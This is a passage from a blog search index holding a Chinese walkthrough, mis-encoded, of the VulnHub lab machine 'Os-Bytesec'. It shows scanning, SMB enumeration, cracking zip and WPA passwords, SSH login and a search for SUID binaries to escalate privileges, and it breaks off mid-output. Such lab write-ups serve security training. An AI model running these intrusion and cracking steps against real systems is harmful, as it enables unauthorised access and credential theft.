<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Os-ByteSec</title>
      <link href="/bilibiliganb.github.io/2023/10/19/Os-ByteSec/"/>
      <url>/bilibiliganb.github.io/2023/10/19/Os-ByteSec/</url>
      
        <content type="html"><![CDATA[<h1 id="Os-ByteSec"><a href="#Os-ByteSec" class="headerlink" title="Os-ByteSec"></a>Os-ByteSec</h1><p>é¶æœºåœ°å€<a href="https://www.vulnhub.com/entry/hacknos-os-bytesec,393/">hackNos: Os-Bytesec ~ VulnHub</a></p><p>ç›®æ ‡ä¸º æ™®é€šç”¨æˆ·çš„<strong>user.txt</strong>å’Œrootç”¨æˆ·çš„<strong>root.txt</strong></p><h2 id="é¶æœºé…ç½®"><a href="#é¶æœºé…ç½®" class="headerlink" title="é¶æœºé…ç½®"></a>é¶æœºé…ç½®</h2><p>é¶æœºç½‘å¡é…ç½®å‚è€ƒæˆ‘ä¹‹å‰çš„<a href="https://blog.csdn.net/witwitwiter/article/details/119889384?spm=1001.2014.3001.5501">Os-hackNos-1_witwitwiterçš„åšå®¢-CSDNåšå®¢</a></p><h2 id="æ¸—é€æµ‹è¯•"><a href="#æ¸—é€æµ‹è¯•" class="headerlink" title="æ¸—é€æµ‹è¯•"></a>æ¸—é€æµ‹è¯•</h2><p>ä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">â””â”€# nmap -sV 192.168.5.135   </span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-29 19:34 CST</span><br><span class="line">Nmap scan report for 192.168.5.135 (192.168.5.135)</span><br><span class="line">Host is up (0.00012s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">2525/tcp open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">MAC Address: 00:0C:29:13:48:B6 (VMware)</span><br><span class="line">Service Info: Host: NITIN; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 11.79 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>dirsearch</code>è¿›è¡Œç›®å½•æ‰«æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">â”€# dirsearch -u &quot;http://192.168.5.135/&quot;</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.1</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10877</span><br><span class="line"></span><br><span class="line">Output File: /root/.dirsearch/reports/192.168.5.135/_21-08-29_19-39-13.txt</span><br><span class="line"></span><br><span class="line">Error Log: /root/.dirsearch/logs/errors-21-08-29_19-39-13.log</span><br><span class="line"></span><br><span class="line">Target: http://192.168.5.135/</span><br><span class="line"></span><br><span class="line">[19:39:13] Starting: </span><br><span class="line">[19:39:13] 301 -  311B  - /js  -&gt;  http://192.168.5.135/js/</span><br><span class="line">[19:39:13] 301 -  313B  - /html  -&gt;  http://192.168.5.135/html/</span><br><span class="line">[19:39:14] 403 -  278B  - /.ht_wsr.txt                                                                                                             </span><br><span class="line">[19:39:14] 403 -  278B  - /.htaccess.bak1</span><br><span class="line">[19:39:14] 403 -  278B  - /.htaccess_extra</span><br><span class="line">[19:39:14] 403 -  278B  - /.htaccess.sample</span><br><span class="line">[19:39:14] 403 -  278B  - /.htaccess.save</span><br><span class="line">[19:39:14] 403 -  278B  - /.htaccess_sc</span><br><span class="line">[19:39:14] 403 -  278B  - /.htaccessOLD2</span><br><span class="line">[19:39:14] 403 -  278B  - /.htaccess_orig</span><br><span class="line">[19:39:14] 403 -  278B  - /.htaccessBAK</span><br><span class="line">[19:39:14] 403 -  278B  - /.htm</span><br><span class="line">[19:39:14] 403 -  278B  - /.htaccessOLD</span><br><span class="line">[19:39:14] 403 -  278B  - /.htaccess.orig</span><br><span class="line">[19:39:14] 403 -  278B  - /.htpasswd_test  </span><br><span class="line">[19:39:14] 403 -  278B  - /.html</span><br><span class="line">[19:39:14] 403 -  278B  - /.htpasswds              </span><br><span class="line">[19:39:14] 403 -  278B  - /.httr-oauth     </span><br><span class="line">[19:39:21] 301 -  312B  - /css  -&gt;  http://192.168.5.135/css/                                                                 </span><br><span class="line">[19:39:23] 301 -  316B  - /gallery  -&gt;  http://192.168.5.135/gallery/                                             </span><br><span class="line">[19:39:23] 200 -  738B  - /html/                                            </span><br><span class="line">[19:39:23] 301 -  312B  - /img  -&gt;  http://192.168.5.135/img/                  </span><br><span class="line">[19:39:23] 200 -    3KB - /index.html                                                                                      </span><br><span class="line">[19:39:23] 200 -    2KB - /js/                                                                                                   </span><br><span class="line">[19:39:25] 301 -  313B  - /news  -&gt;  http://192.168.5.135/news/                                                   </span><br><span class="line">[19:39:27] 403 -  278B  - /server-status                                                                            </span><br><span class="line">[19:39:27] 403 -  278B  - /server-status/</span><br><span class="line">                                                                                                                              </span><br><span class="line">Task Completed </span><br></pre></td></tr></table></figure><p>ä½¿ç”¨nmapæµ‹è¯•smbå®‰å…¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">â””â”€# nmap -v -p139,445 --script=smb-vuln-*.nse --script-args=unsafe=1 192.168.5.135</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-29 19:47 CST</span><br><span class="line">NSE: Loaded 11 scripts for scanning.</span><br><span class="line">NSE: Script Pre-scanning.</span><br><span class="line">Initiating NSE at 19:47</span><br><span class="line">Completed NSE at 19:47, 0.00s elapsed</span><br><span class="line">Initiating ARP Ping Scan at 19:47</span><br><span class="line">Scanning 192.168.5.135 [1 port]</span><br><span class="line">Completed ARP Ping Scan at 19:47, 0.09s elapsed (1 total hosts)</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 19:47</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 19:47, 0.01s elapsed</span><br><span class="line">Initiating SYN Stealth Scan at 19:47</span><br><span class="line">Scanning 192.168.5.135 (192.168.5.135) [2 ports]</span><br><span class="line">Discovered open port 445/tcp on 192.168.5.135</span><br><span class="line">Discovered open port 139/tcp on 192.168.5.135</span><br><span class="line">Completed SYN Stealth Scan at 19:47, 0.15s elapsed (2 total ports)</span><br><span class="line">NSE: Script scanning 192.168.5.135.</span><br><span class="line">Initiating NSE at 19:47</span><br><span class="line">Completed NSE at 19:47, 5.17s elapsed</span><br><span class="line">Nmap scan report for 192.168.5.135 (192.168.5.135)</span><br><span class="line">Host is up (0.00049s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line">MAC Address: 00:0C:29:13:48:B6 (VMware)</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_smb-vuln-ms10-054: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_smb-vuln-ms10-061: false</span><br><span class="line">| smb-vuln-regsvc-dos: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Service regsvc in Microsoft Windows systems vulnerable to denial of service</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference</span><br><span class="line">|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes</span><br><span class="line">|       while working on smb-enum-sessions.</span><br><span class="line">|_          </span><br><span class="line"></span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">Initiating NSE at 19:47</span><br><span class="line">Completed NSE at 19:47, 0.00s elapsed</span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 5.93 seconds</span><br><span class="line">           Raw packets sent: 3 (116B) | Rcvd: 3 (116B)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨smbmapè¿›è¡Œæµ‹è¯•ï¼Œå‘ç°å¯ä»¥åŒ¿åè®¿é—®ä½†æ— æƒé™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â””â”€# smbmap -H 192.168.5.135                                                                                                                                                                                    1 â¨¯</span><br><span class="line">[+] Guest session       IP: 192.168.5.135:445   Name: 192.168.5.135                                     </span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        print$                                                  NO ACCESS       Printer Drivers</span><br><span class="line">        IPC$                                                    NO ACCESS       IPC Service (nitin server (Samba, Ubuntu))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨enum4linuxæµ‹è¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">â””â”€# enum4linux -U 192.168.5.135</span><br><span class="line">Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Aug 29 20:11:41 2021</span><br><span class="line"></span><br><span class="line"> ========================== </span><br><span class="line">|    Target Information    |</span><br><span class="line"> ========================== </span><br><span class="line">Target ........... 192.168.5.135</span><br><span class="line">RID Range ........ 500-550,1000-1050</span><br><span class="line">Username ......... &#x27;&#x27;</span><br><span class="line">Password ......... &#x27;&#x27;</span><br><span class="line">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ===================================================== </span><br><span class="line">|    Enumerating Workgroup/Domain on 192.168.5.135    |</span><br><span class="line"> ===================================================== </span><br><span class="line">[+] Got domain/workgroup name: WORKGROUP</span><br><span class="line"></span><br><span class="line"> ====================================== </span><br><span class="line">|    Session Check on 192.168.5.135    |</span><br><span class="line"> ====================================== </span><br><span class="line">[+] Server 192.168.5.135 allows sessions using username &#x27;&#x27;, password &#x27;&#x27;</span><br><span class="line"></span><br><span class="line"> ============================================ </span><br><span class="line">|    Getting domain SID for 192.168.5.135    |</span><br><span class="line"> ============================================ </span><br><span class="line">Domain Name: WORKGROUP</span><br><span class="line">Domain Sid: (NULL SID)</span><br><span class="line">[+] Can&#x27;t determine if host is part of domain or part of a workgroup</span><br><span class="line"></span><br><span class="line"> ============================== </span><br><span class="line">|    Users on 192.168.5.135    |</span><br><span class="line"> ============================== </span><br><span class="line">index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: smb      Name:   Desc: </span><br><span class="line"></span><br><span class="line">user:[smb] rid:[0x3e8]</span><br><span class="line">enum4linux complete on Sun Aug 29 20:11:41 2021</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨é»˜è®¤å‚æ•°ç›´æ¥è·‘<code>enum4linux 192.168.5.135</code></p><p><img src="/bilibiliganb.github.io/2023/10/19/Os-ByteSec/image-20230628230305489.png" alt="image-20230628230305489"></p><p>å¾—åˆ°sagarã€blackjaxã€smbè¿™ä¸‰ä¸ªç”¨æˆ·</p><p>ç»è¿‡æµ‹è¯•åªæœ‰smbè¿™ä¸ªç”¨æˆ·çš„å¯†ç åœ¨ä¸è¾“å…¥çš„æƒ…å†µèƒ½å¤Ÿè¯»å–ã€‚å³smbç”¨æˆ·æ˜¯ç©ºå¯†ç ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â””â”€# smbmap -u smb  -H 192.168.5.135 </span><br><span class="line">[+] IP: 192.168.5.135:445       Name: 192.168.5.135                                     </span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        print$                                                  READ ONLY       Printer Drivers</span><br><span class="line">        IPC$                                                    NO ACCESS       IPC Service (nitin server (Samba, Ubuntu))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨smbclientç™»å½•è¿›å»,æç¤ºè¾“å…¥å¯†ç ï¼Œç›´æ¥å›è½¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">â””â”€# smbclient //192.168.5.135/smb -U smb</span><br><span class="line">Enter WORKGROUP\smb&#x27;s password: </span><br><span class="line">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="line">smb: \&gt; </span><br></pre></td></tr></table></figure><p>ä½¿ç”¨lsåˆ—å‡ºæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                   D        0  Mon Nov  4 19:50:37 2019</span><br><span class="line">  ..                                  D        0  Mon Nov  4 19:37:28 2019</span><br><span class="line">  main.txt                            N       10  Mon Nov  4 19:45:38 2019</span><br><span class="line">  safe.zip                            N  3424907  Mon Nov  4 19:50:37 2019</span><br><span class="line"></span><br><span class="line">                9204224 blocks of size 1024. 6831688 blocks available</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨getä¸‹è½½è¿™ä¸¤ä¸ªæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">smb: \&gt; get main.txt </span><br><span class="line">getting file \main.txt of size 10 as main.txt (1.4 KiloBytes/sec) (average 1.4 KiloBytes/sec)</span><br><span class="line">smb: \&gt; get safe.zip </span><br><span class="line">getting file \safe.zip of size 3424907 as safe.zip (65581.0 KiloBytes/sec) (average 57666.3 KiloBytes/sec)</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æ–‡ä»¶å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â””â”€# cat main.txt       </span><br><span class="line">helo</span><br></pre></td></tr></table></figure><p>è§£å‹safe.zipæ—¶å‘ç°æœ‰å¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">â””â”€# unzip safe.zip                            </span><br><span class="line">Archive:  safe.zip</span><br><span class="line">[safe.zip] secret.jpg password: </span><br><span class="line">   skipping: secret.jpg              incorrect password</span><br><span class="line">   skipping: user.cap                incorrect password</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨johnç ´è§£å¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# zip2john safe.zip &gt; safepass                                                                                                                                                                              82 â¨¯</span><br><span class="line">ver 2.0 efh 5455 efh 7875 safe.zip/secret.jpg PKZIP Encr: 2b chk, TS_chk, cmplen=60550, decmplen=62471, crc=6D48091C</span><br><span class="line">ver 2.0 efh 5455 efh 7875 safe.zip/user.cap PKZIP Encr: 2b chk, TS_chk, cmplen=3364011, decmplen=6920971, crc=717BA9D6</span><br><span class="line">NOTE: It is assumed that all files in each archive have the same password.</span><br><span class="line">If that is not the case, the hash may be uncrackable. To avoid this, use</span><br><span class="line">option -o to pick a file at a time.</span><br><span class="line">                                                                                                                                                                                                                   </span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# john safepass </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (PKZIP [32/64])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Proceeding with single, rules:Single</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">Warning: Only 6 candidates buffered for the current salt, minimum 8 needed for performance.</span><br><span class="line">Warning: Only 3 candidates buffered for the current salt, minimum 8 needed for performance.</span><br><span class="line">Warning: Only 6 candidates buffered for the current salt, minimum 8 needed for performance.</span><br><span class="line">Warning: Only 4 candidates buffered for the current salt, minimum 8 needed for performance.</span><br><span class="line">Warning: Only 3 candidates buffered for the current salt, minimum 8 needed for performance.</span><br><span class="line">Almost done: Processing the remaining buffered candidate passwords, if any.</span><br><span class="line">Warning: Only 1 candidate buffered for the current salt, minimum 8 needed for performance.</span><br><span class="line">Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist</span><br><span class="line">hacker1          (safe.zip)</span><br><span class="line">1g 0:00:00:00 DONE 2/3 (2021-08-29 21:06) 20.00g/s 1680Kp/s 1680Kc/s 1680KC/s fireballs..faithfaith</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ–è€…ä½¿ç”¨<code>fcrackzip</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">â””â”€# fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u safe.zip</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PASSWORD FOUND!!!!: pw == hacker1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¾—åˆ°å¯†ç ä¸º<code>hacker1</code></p><p>è§£å‹åå¾—åˆ°secret.jpgå’Œuser.cap</p><p>å›¾ç‰‡ä¸Šæ²¡å¾—åˆ°ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯</p><p>user.capæ˜¯ä¸€ä¸ªwifiæŠ“åŒ…</p><p>ä½¿ç”¨<code>aircrack-ng</code>ç ´è§£å¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -w /usr/share/wordlists/rockyou.txt user.cap</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                               Aircrack-ng 1.6 </span><br><span class="line"></span><br><span class="line">      [00:00:00] 2354/10303727 keys tested (9801.73 k/s) </span><br><span class="line"></span><br><span class="line">      Time left: 17 minutes, 30 seconds                          0.02%</span><br><span class="line"></span><br><span class="line">                           KEY FOUND! [ snowflake ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      Master Key     : 88 D4 8C 29 79 BF DF 88 B4 14 0F 5A F3 E8 FB FB </span><br><span class="line">                       59 95 91 7F ED 3E 93 DB 2A C9 BA FB EE 07 EA 62 </span><br><span class="line"></span><br><span class="line">      Transient Key  : 1F 89 42 F4 E2 74 8B 00 00 00 00 00 00 00 00 00 </span><br><span class="line">                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 </span><br><span class="line">                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 </span><br><span class="line">                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 </span><br><span class="line"></span><br><span class="line">      EAPOL HMAC     : ED B5 F7 D9 56 98 B0 5E 25 7D 86 08 C4 D4 02 3D </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¾—åˆ°å¯†ç <code>snowflake</code></p><p>sshç™»å½•,ä¹‹å‰nmapæ‰«æå‡ºsshç«¯å£ä¸º2525ï¼Œæ•…åŠ ä¸Š-p 2525</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">â””â”€# ssh blackjax@192.168.5.135 -p 2525  </span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>åˆ‡æ¢shell</p><p>å¾—åˆ°user.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">blackjax@nitin:~$ cat /home/blackjax/user.txt </span><br><span class="line">  _    _  _____ ______ _____        ______ _               _____ </span><br><span class="line"> | |  | |/ ____|  ____|  __ \      |  ____| |        /\   / ____|</span><br><span class="line"> | |  | | (___ | |__  | |__) |_____| |__  | |       /  \ | |  __ </span><br><span class="line"> | |  | |\___ \|  __| |  _  /______|  __| | |      / /\ \| | |_ |</span><br><span class="line"> | |__| |____) | |____| | \ \      | |    | |____ / ____ \ |__| |</span><br><span class="line">  \____/|_____/|______|_|  \_\     |_|    |______/_/    \_\_____|</span><br><span class="line">                                                                 </span><br><span class="line">                                                                 </span><br><span class="line"></span><br><span class="line">Go To Root.</span><br><span class="line"></span><br><span class="line">MD5-HASH : f589a6959f3e04037eb2b3eb0ff726ac</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å°è¯•sudoææƒ,å¤±è´¥åæŸ¥æ‰¾å…·æœ‰rootæƒé™çš„å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">blackjax@nitin:~$ sudo su root</span><br><span class="line">[sudo] password for blackjax: </span><br><span class="line">blackjax is not in the sudoers file.  This incident will be reported.</span><br><span class="line">blackjax@nitin:~$ find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/snapd/snap-confine</span><br><span class="line">/usr/lib/i386-linux-gnu/lxc/lxc-user-nic</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/bin/newgidmap</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/newuidmap</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/netscan</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/bin/ping6</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/ntfs-3g</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨netscanï¼Œå‘ç°ä¸netstat -natpå·®ä¸å¤š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">blackjax@nitin:~$ netscan</span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line">tcp        0      0 0.0.0.0:2525            0.0.0.0:*               LISTEN      1153/sshd       </span><br><span class="line">tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      1010/smbd       </span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      1181/mysqld     </span><br><span class="line">tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      1010/smbd       </span><br><span class="line">tcp        0      0 192.168.5.135:2525      192.168.5.129:54132     ESTABLISHED 3415/sshd: blackjax</span><br><span class="line">tcp6       0      0 :::2525                 